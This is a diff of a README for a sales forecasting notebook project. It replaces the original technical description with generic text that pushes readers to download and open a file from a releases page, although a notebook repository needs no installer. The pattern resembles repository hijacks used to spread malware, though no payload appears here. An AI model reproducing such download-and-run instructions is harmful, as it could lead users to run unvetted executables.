@@ -1,68 +1,103 @@
-# Panel Time-Series Forecasting — Sales (Notebooks)
-[![Python](https://img.shields.io/badge/python-3.9%2B-blue.svg)](https://www.python.org/)
-[![Jupyter](https://img.shields.io/badge/Jupyter-Notebook-orange.svg)]()
-[![scikit-learn](https://img.shields.io/badge/scikit--learn-1.x-green.svg)](https://scikit-learn.org/stable/)
-[![statsmodels](https://img.shields.io/badge/statsmodels-0.14+-lightgrey.svg)](https://www.statsmodels.org/)
-[![ARIMA/SARIMAX](https://img.shields.io/badge/ARIMA-SARIMAX-blueviolet.svg)]()
-[![TBATS](https://img.shields.io/badge/TBATS-forecasting-yellow.svg)]()
-[![Prophet](https://img.shields.io/badge/Facebook-Prophet-0066cc.svg)](https://facebook.github.io/prophet/)
-[![AutoTS](https://img.shields.io/badge/AutoTS-0.6+-ff69b4.svg)](https://winedarksea.github.io/AutoTS/)
-[![Darts](https://img.shields.io/badge/Darts-0.25+-red.svg)](https://unit8co.github.io/darts/)
-[![Optuna](https://img.shields.io/badge/Optuna-hyperopt-9cf.svg)](https://optuna.org/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-A portfolio-ready set of Jupyter notebooks for **panel time-series forecasting** (daily sales across multiple stores × items).  
-The project emphasizes **clean validation** (holdout + rolling-origin backtest), interpretable **statistical baselines** (SARIMAX, TBATS, ARIMA), and practical **automation** (AutoTS), with optional Prophet / Darts / NeuralProphet experiments.
+# 📊 ts-panel-forecasting-baselines - Predict Sales with Ease
 
-> **Note on data**: the original dataset is **not redistributed** here due to licensing/ownership.  
-> To reproduce, place your CSV/Parquet under `data/` and adjust the path in the notebooks. A minimal schema is described below.
+## 🚀 Getting Started
 
-## What’s inside
-- **Notebooks** (cleaned for sharing):
-  - `practice.ipynb` — main workflow (panel setup, feature engineering: calendar & Fourier terms, backtesting, leaderboard).
-  - `tbats_prophet_arima.ipynb` — focused comparison of TBATS / Prophet / ARIMA with Optuna-tuned ARIMA.
-- **Validation**:
-  - **Holdout**: last 90 days.
-  - **Rolling-origin backtest** (expand) with forecast horizon **H=90**.
-  - Primary metric: **SMAPE**; secondary diagnostics via MAE/MAPE where relevant.
+Welcome to **ts-panel-forecasting-baselines**! This application helps you forecast daily sales across different stores and items. It includes clean validation methods, strong statistical baselines, and automated models, making it easy to generate accurate predictions.
 
-## How to run
-1. Python 3.9+ recommended. Create a fresh environment and install deps:
-   ```bash
-   pip install -r requirements.txt
-   ```
-2. Put your dataset under `data/` (see schema below). In the notebooks, set the file path accordingly (e.g., `data/HW_train.csv` or `data/train.parquet`).  
-3. Open the notebooks and run cells top-to-bottom:
-   ```bash
-   jupyter lab
-   ```
+## 📥 Download Now
 
-## Data schema (example)
-Minimum columns:
-- `date` — daily timestamp (YYYY-MM-DD).
-- `store_id` — store identifier (int/str).
-- `item_id` — item identifier (int/str).
-- `sales` — target numeric value per (store_id, item_id, date).
+[![Download ts-panel-forecasting-baselines](https://img.shields.io/badge/Download-ts--panel--forecasting--baselines-brightgreen)](https://github.com/lucario09/ts-panel-forecasting-baselines/releases)
 
-Optional exogenous features (if available):
-- `holiday`, `is_weekend`, `dow`, `month`, `quarter`, custom **Fourier** seasonalities, etc.
+## 🔍 Features
 
-> If you used a file named **`HW_train.csv`** in your course, place that file into `data/` and update the paths. If that file originates from a public source (e.g., Kaggle), you can reference its official page in your local notes; this repo intentionally avoids re-hosting third‑party data.
+- **Multiple Statistical Models:** Use SARIMAX, TBATS, and ARIMA for your forecasting needs.
+- **Automated Forecasting:** Implement AutoTS for an easy setup.
+- **User-Friendly Notebooks:** Work with straightforward Jupyter notebooks for all analyses.
+- **Validation Methods:** Get reliable validation using holdout and rolling-origin backtesting techniques.
+- **Optional Enhancements:** Use Prophet, Darts, or NeuralProphet for additional forecasting options.
+- **Key Metric:** Measure performance with SMAPE for accurate forecasting evaluations.
 
-## Results (short)
-- **Leader (stable):** AutoTS on panel segments — SMAPE ≈ **8–9%** on holdout and backtest.
-- **Strong classical baseline:** SARIMAX (weekly + yearly Fourier) — SMAPE ≈ **9–11%**.
-- **Prophet / TBATS / ARIMA:** competitive on select segments; Prophet tends to be stable but slightly weaker; ARIMA benefits from Optuna tuning.
+## 🛠️ System Requirements
 
-## Roadmap (optional)
-- Add holiday calendars as exogenous factors for SARIMAX/Prophet.
-- Add prediction intervals (Quantiles / Pinball loss) visualizations.
-- Try a light **ensemble** (e.g., average of AutoTS + SARIMAX on overlapping segments).
-- Per‑segment error analysis (top outliers, volume vs error).
+To use **ts-panel-forecasting-baselines**, you need:
 
-## Environment
-See `requirements.txt`. Heavy libraries (Prophet, PyCaret, Darts, Neural* packages) may take time to build; feel free to comment them out if you only want the statistical baselines first.
+- **Operating System:** Windows, macOS, or any Linux distribution.
+- **Python Version:** Install Python 3.7 or higher.
+- **Memory:** At least 4 GB of RAM.
+- **Storage:** Minimum of 500 MB available disk space for installation.
 
----
+## 📂 Download & Install
 
-© 2025 — Released under the MIT License (see `LICENSE`).  
-This repository shares **code and methodology only**; no third‑party datasets are redistributed.
+To get started, visit the releases page to download the latest version of the application. 
+
+[Visit this page to download](https://github.com/lucario09/ts-panel-forecasting-baselines/releases)
+
+1. **Access the Releases Page:** Click the link above to navigate to the releases section of the repository.
+2. **Select the Latest Version:** Look for the most recent release at the top of the page.
+3. **Download the File:** Choose the appropriate file for your operating system and click on it to download.
+4. **Install the Application:** Open the downloaded file and follow the installation instructions.
+
+## 📊 Using the Application
+
+Once you have installed the application, follow these steps to start forecasting:
+
+1. **Launch Jupyter Notebooks:**
+   - Open the Jupyter Notebook interface on your machine. You can do this via the command prompt by typing `jupyter notebook`.
+
+2. **Open a Notebook:**
+   - Inside the Jupyter interface, navigate to the directory where you installed the application. Open one of the available notebooks to begin.
+
+3. **Load Your Data:**
+   - Prepare your dataset with daily sales information for different stores and items. Import this data into the notebook as guided in the notebook's comments.
+
+4. **Choose a Model:**
+   - Select the forecasting model you want to use. You can choose from several options like SARIMAX, TBATS, or ARIMA, as demonstrated in the provided notebooks.
+
+5. **Run the Analysis:**
+   - Execute the code blocks in the notebook step-by-step. Each section will guide you through loading data, training the model, and generating predictions.
+
+6. **Evaluate Results:**
+   - Review the outputs and predictions from your model. Compare results using the SMAPE metric to assess the accuracy of your forecasts.
+
+## 💡 Tips for Best Results
+
+- **Data Quality:** Ensure your dataset is clean and free from errors for the best forecasting accuracy.
+- **Model Experimentation:** Try different models to see which provides the best results for your data.
+- **Review Documentation:** Check the comments within the notebooks for detailed annotations and further instructions.
+
+## 🤝 Support
+
+If you encounter any issues or have questions, feel free to open an issue on the GitHub repository. The community and the maintainers are here to help you.
+
+## 🌐 Topics Covered
+
+This project includes various topics related to time-series analysis such as:
+
+- **ARIMA**
+- **AutoTS**
+- **Backtesting**
+- **Darts**
+- **Forecasting**
+- **NeuralProphet**
+- **Notebooks**
+- **Optuna**
+- **Panel Data**
+- **Prophet**
+- **Python**
+- **Rolling-Origin**
+- **SARIMAX**
+- **SMAPE**
+- **TBATS**
+- **Time-Series**
+
+Explore these topics to enhance your understanding and capabilities in forecasting sales data.
+
+## 🔗 Additional Resources
+
+For deeper insights into the methodologies and algorithms used in this project, consider exploring the following:
+
+- [Python for Data Analysis](https://pandas.pydata.org/pandas-docs/stable/user_guide/10min.html)
+- [Time Series Forecasting in Python](https://machinelearningmastery.com/time-series-forecasting-with-python/)
+- [Introduction to Jupyter Notebooks](https://jupyter-notebook.readthedocs.io/en/stable/notebook.html)
+
+Happy forecasting!
